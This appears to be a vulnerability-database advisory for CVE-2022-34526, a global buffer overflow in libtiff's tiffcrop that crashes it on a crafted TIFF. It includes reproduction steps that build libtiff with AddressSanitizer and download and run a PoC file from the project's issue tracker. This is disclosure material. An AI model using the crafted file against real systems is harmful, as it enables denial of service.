{"hash":"16a3b2aae6d851038dc28f60b7b780cc42312696","data":{"post":{"title":"libtiff tiffcrop buffer overflow DoS","path":"/vulnerabilities/libtiff-buffer-overflow-dos-xray-259933/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>A global-memory buffer overflow in the libtiff library leads to denial of service when processing crafted TIFF images with tiffcrop.</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"http://www.libtiff.org/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">libtiff</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>libtiff (,), no fixed release</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>A 4-byte global-memory buffer overflow occurs when <code>tiffcrop</code> is run with the <code>-i</code> argument against a crafted TIFF file, leading to a crash of <code>tiffcrop</code>.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>Compile libtiff 4.4.0 with ASAN</p>\n<pre><code>curl https://gitlab.com/libtiff/libtiff/-/archive/v4.4.0/libtiff-v4.4.0.tar.gz -o libtiff-v4.4.0.tar.gz\ntar -xf libtiff-v4.4.0.tar.gz\ncd libtiff-v4.4.0\nCC=gcc CXX=g++ CFLAGS=\"-ggdb -fsanitize=address\" ./configure &#x26;&#x26; make\n</code></pre>\n<p>Run the PoC</p>\n<pre><code>cd tools\ncurl https://gitlab.com/libtiff/libtiff/uploads/9943030806e03e7d2b8dff5ec0341b6f/poc.zip -o poc.zip\nunzip poc.zip\n./tiffcrop -i poc.tif a.tif\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No vulnerability mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://gitlab.com/libtiff/libtiff/-/issues/486\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Advisory &#x26; PoC exploit</a></p>\n","description":"CVE-2022-34526 Medium severity. A global-memory buffer overflow in the libtiff library leads to denial of service when processing crafted TIFF images with tiffcrop.","date_published":"2022-11-16","xray_id":"XRAY-259933","vul_id":"CVE-2022-34526","severity":"medium","discovered_by":"Nitay Meiron","last_updated":"2022-11-16","cvss":6.5}},"context":{}}